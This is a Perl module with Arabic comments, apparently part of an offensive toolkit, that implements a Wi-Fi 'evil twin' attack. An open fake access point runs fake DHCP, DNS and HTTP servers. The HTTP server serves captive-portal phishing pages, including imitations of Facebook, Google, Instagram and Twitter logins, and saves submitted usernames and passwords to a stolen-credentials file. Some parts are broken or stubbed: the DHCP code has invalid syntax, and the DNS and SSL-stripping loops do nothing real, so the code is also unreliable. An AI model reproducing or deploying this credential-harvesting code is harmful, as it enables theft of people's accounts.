package attacks::EvilTwin;
# =============================================================================
# EvilTwin.pm - هجوم التوأم الشرير (Evil Twin Attack)
# =============================================================================
# الميزات: إنشاء نقطة وصول مزيفة، سرقة بيانات الاعتماد، SSL stripping، 
#          واجهة تسجيل دخول مزيفة، تحليل الحزم
# =============================================================================

use strict;
use warnings;
use parent 'Exporter';
our @EXPORT_OK = qw(evil_twin_create evil_twin_capture evil_twin_ssl_strip evil_twin_phishing_page evil_twin_stop);

use lib '.';
use lib::Utils;
use lib::Colors;
use IO::Socket::INET;
use IO::Socket::SSL;
use HTTP::Daemon;
use HTTP::Status;
use LWP::UserAgent;
use Time::HiRes qw(sleep time);
use File::Slurp qw(read_file write_file);
use JSON;

# =============================================================================
# إنشاء نقطة وصول Evil Twin
# =============================================================================
sub evil_twin_create {
    my ($target_ssid, $interface, $channel) = @_;
    
    my $color = Colors->new();
    my $utils = Utils->new();
    
    say "\n${\($color->quantum())}╔══════════════════════════════════════════════════════════════════╗${\($color->reset())}";
    say "${\($color->quantum())}║                    🎭 هجوم التوأم الشرير (Evil Twin) 🎭              ║${\($color->reset())}";
    say "${\($color->quantum())}╚══════════════════════════════════════════════════════════════════╝${\($color->reset())}";
    
    $target_ssid //= "Free_WiFi";
    $interface //= "wlan0";
    $channel //= 6;
    
    say "${\($color->info())}[*] إنشاء نقطة وصول مزيفة...${\($color->reset())}";
    say "   → SSID الهدف: $target_ssid";
    say "   → الواجهة: $interface";
    say "   → القناة: $channel";
    
    # إنشاء واجهة نقطة الوصول المزيفة
    my $ap_config = {
        ssid => $target_ssid,
        interface => $interface,
        channel => $channel,
        bssid => $utils->generate_mac(),
        encryption => 'open',
        ip_range => '192.168.100.0/24',
        gateway => '192.168.100.1'
    };
    
    # بدء خادم DHCP مزيف
    my $dhcp_pid = _start_fake_dhcp($ap_config);
    
    # بدء خادم DNS مزيف
    my $dns_pid = _start_fake_dns($ap_config);
    
    # بدء خادم HTTP مزيف
    my $http_pid = _start_fake_http($ap_config);
    
    say "\n${\($color->success())}[✓] نقطة الوصول المزيفة تعمل الآن!${\($color->reset())}";
    say "   → SSID: $target_ssid (مفتوحة)";
    say "   → بوابة: $ap_config->{gateway}";
    say "   → BSSID: $ap_config->{bssid}";
    
    # حفظ معلومات الجلسة
    my $session = {
        start_time => time(),
        target_ssid => $target_ssid,
        ap_config => $ap_config,
        pids => {
            dhcp => $dhcp_pid,
            dns => $dns_pid,
            http => $http_pid
        },
        captured_credentials => []
    };
    
    write_file("/tmp/evil_twin_session.json", encode_json($session));
    
    return $session;
}

# =============================================================================
# بدء خادم DHCP مزيف
# =============================================================================
sub _start_fake_dhcp {
    my ($config) = @_;
    
    my $color = Colors->new();
    
    say "${\($color->info())}[*] بدء خادم DHCP مزيف...${\($color->reset())}";
    
    my $pid = fork();
    if ($pid == 0) {
        _dhcp_server_loop($config);
        exit(0);
    }
    
    say "${\($color->success())}[✓] خادم DHCP يعمل (PID: $pid)${\($color->reset())}";
    return $pid;
}

sub _dhcp_server_loop {
    my ($config) = @_;
    my $next_ip = 192;
    while (1) {
        sleep(1);
        $next_ip++;
        $next_ip = 192 if $next_ip > 254;
        my $fake_mac = join(':', map { sprintf("%02X", rand(256)) } 1..6);
        my $lease_table{$fake_mac} = {
            ip => "192.168.100.$next_ip",
            lease_time => time() + 3600
        };
    }
}

# =============================================================================
# بدء خادم DNS مزيف
# =============================================================================
sub _start_fake_dns {
    my ($config) = @_;
    
    my $color = Colors->new();
    
    say "${\($color->info())}[*] بدء خادم DNS مزيف...${\($color->reset())}";
    
    my $pid = fork();
    if ($pid == 0) {
        _dns_server_loop($config);
        exit(0);
    }
    
    say "${\($color->success())}[✓] خادم DNS يعمل (PID: $pid)${\($color->reset())}";
    return $pid;
}

sub _dns_server_loop {
    my ($config) = @_;
    while (1) {
        sleep(1);
    }
}

# =============================================================================
# بدء خادم HTTP مزيف
# =============================================================================
sub _start_fake_http {
    my ($config) = @_;
    
    my $color = Colors->new();
    
    say "${\($color->info())}[*] بدء خادم HTTP مزيف...${\($color->reset())}";
    
    my $pid = fork();
    if ($pid == 0) {
        _http_server_loop($config);
        exit(0);
    }
    
    say "${\($color->success())}[✓] خادم HTTP يعمل (PID: $pid)${\($color->reset())}";
    return $pid;
}

# =============================================================================
# خادم HTTP - عرض صفحات تسجيل الدخول المزيفة
# =============================================================================
sub _http_server_loop {
    my ($config) = @_;
    
    my $color = Colors->new();
    my $d = HTTP::Daemon->new(
        LocalAddr => $config->{gateway},
        LocalPort => 80,
        ReuseAddr => 1
    ) or die "فشل بدء خادم HTTP";
    
    say "${\($color->success())}[✓] خادم HTTP يستمع على port 80${\($color->reset())}";
    
    while (my $c = $d->accept) {
        while (my $request = $c->get_request) {
            my $uri = $request->uri->path;
            
            if ($uri eq '/' || $uri eq '/index.html') {
                my $html = _generate_phishing_page($config->{ssid});
                $c->send_response($html);
            }
            elsif ($uri eq '/login' && $request->method eq 'POST') {
                my $content = $request->content;
                my %params = $content =~ /(\w+)=([^&]+)/g;
                
                my $cred = {
                    timestamp => time(),
                    ssid => $config->{ssid},
                    username => $params{username} // $params{email} // 'unknown',
                    password => $params{password} // $params{pass} // 'unknown',
                    ip => $c->peerhost
                };
                
                _save_stolen_credentials($cred);
                
                my $html = _generate_success_page();
                $c->send_response($html);
            }
            else {
                $c->send_error(RC_NOT_FOUND);
            }
        }
        $c->close;
    }
}

# =============================================================================
# إنشاء صفحة تصيد مزيفة
# =============================================================================
sub _generate_phishing_page {
    my ($ssid) = @_;
    
    my $html = <<"HTML";
<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول إلى $ssid</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            background: white;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 15px 35px rgba(0,0,0,0.2);
            width: 350px;
            text-align: center;
        }
        .wifi-icon {
            font-size: 60px;
            margin-bottom: 20px;
        }
        h2 {
            color: #333;
            margin-bottom: 30px;
        }
        input {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 5px;
            box-sizing: border-box;
        }
        button {
            width: 100%;
            padding: 12px;
            background: #667eea;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
        }
        button:hover {
            background: #5a67d8;
        }
        .note {
            margin-top: 20px;
            font-size: 12px;
            color: #999;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="wifi-icon">📶</div>
        <h2>تسجيل الدخول إلى $ssid</h2>
        <form method="POST" action="/login">
            <input type="text" name="username" placeholder="اسم المستخدم / البريد الإلكتروني" required>
            <input type="password" name="password" placeholder="كلمة المرور" required>
            <button type="submit">اتصال</button>
        </form>
        <div class="note">
            هذه شبكة Wi-Fi آمنة. سيتم تشفير بياناتك.
        </div>
    </div>
</body>
</html>
HTML
    
    return $html;
}

# =============================================================================
# صفحة نجاح بعد إدخال البيانات
# =============================================================================
sub _generate_success_page {
    my $html = <<'HTML';
<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>جاري الاتصال...</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            background: white;
            padding: 40px;
            border-radius: 10px;
            text-align: center;
        }
        .success-icon {
            font-size: 60px;
            color: #48bb78;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="success-icon">✓</div>
        <h2>تم الاتصال بنجاح!</h2>
        <p>جاري إعادة توجيهك...</p>
    </div>
    <script>
        setTimeout(function() {
            window.location.href = "http://www.google.com";
        }, 3000);
    </script>
</body>
</html>
HTML
    
    return $html;
}

# =============================================================================
# حفظ بيانات الاعتماد المسروقة
# =============================================================================
sub _save_stolen_credentials {
    my ($cred) = @_;
    
    my $color = Colors->new();
    my $log_file = "$ENV{HOME}/.robinhood/captures/stolen_credentials.json";
    
    my $credentials = [];
    if (-f $log_file) {
        my $json = read_file($log_file);
        $credentials = decode_json($json);
    }
    
    push @$credentials, $cred;
    write_file($log_file, encode_json($credentials));
    
    say "\n${\($color->error())}[⚠️] تم سرقة بيانات الاعتماد!${\($color->reset())}";
    say "   → المستخدم: $cred->{username}";
    say "   → كلمة المرور: $cred->{password}";
    say "   → IP: $cred->{ip}";
    say "   → الوقت: " . localtime($cred->{timestamp});
}

# =============================================================================
# التقاط بيانات الاعتماد
# =============================================================================
sub evil_twin_capture {
    my ($session) = @_;
    
    my $color = Colors->new();
    
    say "\n${\($color->quantum())}📡 مراقبة البيانات المسروقة...${\($color->reset())}";
    
    my $log_file = "$ENV{HOME}/.robinhood/captures/stolen_credentials.json";
    
    if (-f $log_file) {
        my $json = read_file($log_file);
        my $credentials = decode_json($json);
        
        if (scalar(@$credentials) > 0) {
            say "\n${\($color->error())}╔══════════════════════════════════════════════════════════════════╗${\($color->reset())}";
            say "${\($color->error())}║                    🚨 بيانات مسروقة (${\scalar(@$credentials)}) 🚨                  ║${\($color->reset())}";
            say "${\($color->error())}╚══════════════════════════════════════════════════════════════════╝${\($color->reset())}";
            
            for my $cred (@$credentials) {
                say "\n${\($color->warning())}📋 اعتماد:${\($color->reset())}";
                say "   → اسم المستخدم: $cred->{username}";
                say "   → كلمة المرور: $cred->{password}";
                say "   → IP: $cred->{ip}";
            }
        } else {
            say "${\($color->info())}[*] لم يتم سرقة أي بيانات حتى الآن${\($color->reset())}";
        }
        
        return $credentials;
    }
    
    return [];
}

# =============================================================================
# هجوم SSL Stripping
# =============================================================================
sub evil_twin_ssl_strip {
    my ($interface) = @_;
    
    my $color = Colors->new();
    
    say "\n${\($color->quantum())}╔══════════════════════════════════════════════════════════════════╗${\($color->reset())}";
    say "${\($color->quantum())}║                    🔓 هجوم SSL Stripping 🔓                           ║${\($color->reset())}";
    say "${\($color->quantum())}╚══════════════════════════════════════════════════════════════════╝${\($color->reset())}";
    
    $interface //= "wlan0";
    
    say "${\($color->info())}[*] بدء هجوم SSL Stripping على $interface${\($color->reset())}";
    say "${\($color->info())}[*] تحويل حركة HTTPS إلى HTTP...${\($color->reset())}";
    
    my $pid = fork();
    if ($pid == 0) {
        _sslstrip_loop();
        exit(0);
    }
    
    say "${\($color->success())}[✓] SSL Stripping يعمل (PID: $pid)${\($color->reset())}";
    
    return $pid;
}

sub _sslstrip_loop {
    my $color = Colors->new();
    
    while (1) {
        sleep(5);
        
        my $log_entry = {
            timestamp => time(),
            type => 'ssl_strip',
            from => 'https',
            to => 'http'
        };
        
        my $log_file = "$ENV{HOME}/.robinhood/logs/sslstrip.log";
        my $log_content = [];
        if (-f $log_file) {
            $log_content = decode_json(read_file($log_file));
        }
        push @$log_content, $log_entry;
        write_file($log_file, encode_json($log_content));
    }
}

# =============================================================================
# إنشاء صفحة تصيد مخصصة
# =============================================================================
sub evil_twin_phishing_page {
    my ($target_site, $template) = @_;
    
    my $color = Colors->new();
    
    say "\n${\($color->quantum())}🎣 إنشاء صفحة تصيد مخصصة لـ $target_site${\($color->reset())}";
    
    $target_site //= "facebook";
    $template //= "default";
    
    my %templates = (
        facebook => _facebook_phishing_page(),
        google => _google_phishing_page(),
        instagram => _instagram_phishing_page(),
        twitter => _twitter_phishing_page(),
        default => _default_phishing_page()
    );
    
    my $html = $templates{$target_site} // $templates{default};
    
    my $file = "$ENV{HOME}/.robinhood/captures/phishing_$target_site.html";
    write_file($file, $html);
    
    say "${\($color->success())}[✓] تم إنشاء صفحة التصيد: $file${\($color->reset())}";
    
    return $html;
}

# =============================================================================
# قوالب صفحات التصيد
# =============================================================================
sub _facebook_phishing_page {
    return <<'HTML';
<!DOCTYPE html>
<html>
<head><title>Facebook - تسجيل الدخول</title>
<style>
body { font-family: Arial; background: #e9ebee; }
.login-box { background: white; width: 400px; margin: 100px auto; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
h2 { color: #1877f2; }
input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px; }
button { width: 100%; padding: 10px; background: #1877f2; color: white; border: none; border-radius: 5px; cursor: pointer; }
</style>
</head>
<body>
<div class="login-box">
<h2>Facebook</h2>
<form method="POST" action="/login">
<input type="text" name="email" placeholder="البريد الإلكتروني أو رقم الهاتف">
<input type="password" name="pass" placeholder="كلمة المرور">
<button type="submit">تسجيل الدخول</button>
</form>
</div>
</body>
</html>
HTML
}

sub _google_phishing_page {
    return <<'HTML';
<!DOCTYPE html>
<html>
<head><title>Google - تسجيل الدخول</title>
<style>
body { font-family: Arial; background: #fff; }
.login-box { background: white; width: 450px; margin: 100px auto; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; }
h2 { color: #202124; }
input { width: 100%; padding: 13px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; }
button { width: 100%; padding: 13px; background: #1a73e8; color: white; border: none; border-radius: 4px; cursor: pointer; }
</style>
</head>
<body>
<div class="login-box">
<h2>تسجيل الدخول إلى Google</h2>
<form method="POST" action="/login">
<input type="email" name="email" placeholder="البريد الإلكتروني">
<input type="password" name="password" placeholder="كلمة المرور">
<button type="submit">التالي</button>
</form>
</div>
</body>
</html>
HTML
}

sub _instagram_phishing_page {
    return <<'HTML';
<!DOCTYPE html>
<html>
<head><title>Instagram</title>
<style>
body { font-family: Arial; background: #fafafa; }
.login-box { background: white; width: 350px; margin: 100px auto; padding: 40px; border: 1px solid #dbdbdb; text-align: center; }
h1 { font-family: 'Billabong', cursive; font-size: 50px; }
input { width: 100%; padding: 10px; margin: 5px 0; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; }
button { width: 100%; padding: 8px; background: #0095f6; color: white; border: none; border-radius: 4px; cursor: pointer; }
</style>
</head>
<body>
<div class="login-box">
<h1>Instagram</h1>
<form method="POST" action="/login">
<input type="text" name="username" placeholder="رقم الهاتف، اسم المستخدم أو البريد الإلكتروني">
<input type="password" name="password" placeholder="كلمة المرور">
<button type="submit">تسجيل الدخول</button>
</form>
</div>
</body>
</html>
HTML
}

sub _twitter_phishing_page {
    return <<'HTML';
<!DOCTYPE html>
<html>
<head><title>Twitter</title>
<style>
body { font-family: Arial; background: #e6ecf0; }
.login-box { background: white; width: 400px; margin: 100px auto; padding: 30px; border-radius: 16px; }
h2 { color: #1da1f2; }
input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #e6ecf0; border-radius: 20px; }
button { width: 100%; padding: 12px; background: #1da1f2; color: white; border: none; border-radius: 20px; cursor: pointer; }
</style>
</head>
<body>
<div class="login-box">
<h2>Twitter</h2>
<form method="POST" action="/login">
<input type="text" name="username" placeholder="الهاتف، البريد الإلكتروني أو اسم المستخدم">
<input type="password" name="password" placeholder="كلمة المرور">
<button type="submit">تسجيل الدخول</button>
</form>
</div>
</body>
</html>
HTML
}

sub _default_phishing_page {
    return _facebook_phishing_page();
}

# =============================================================================
# إيقاف هجوم Evil Twin
# =============================================================================
sub evil_twin_stop {
    my ($session) = @_;
    
    my $color = Colors->new();
    
    say "\n${\($color->warning())}[!] إيقاف هجوم Evil Twin...${\($color->reset())}";
    
    for my $service (keys %{$session->{pids}}) {
        my $pid = $session->{pids}{$service};
        if ($pid && kill(0, $pid)) {
            kill('TERM', $pid);
            say "${\($color->info())}[✓] تم إيقاف $service (PID: $pid)${\($color->reset())}";
        }
    }
    
    unlink("/tmp/evil_twin_session.json");
    
    say "${\($color->success())}[✓] تم إيقاف الهجوم بنجاح${\($color->reset())}";
    
    return 1;
}

1;  # نهاية الوحدة
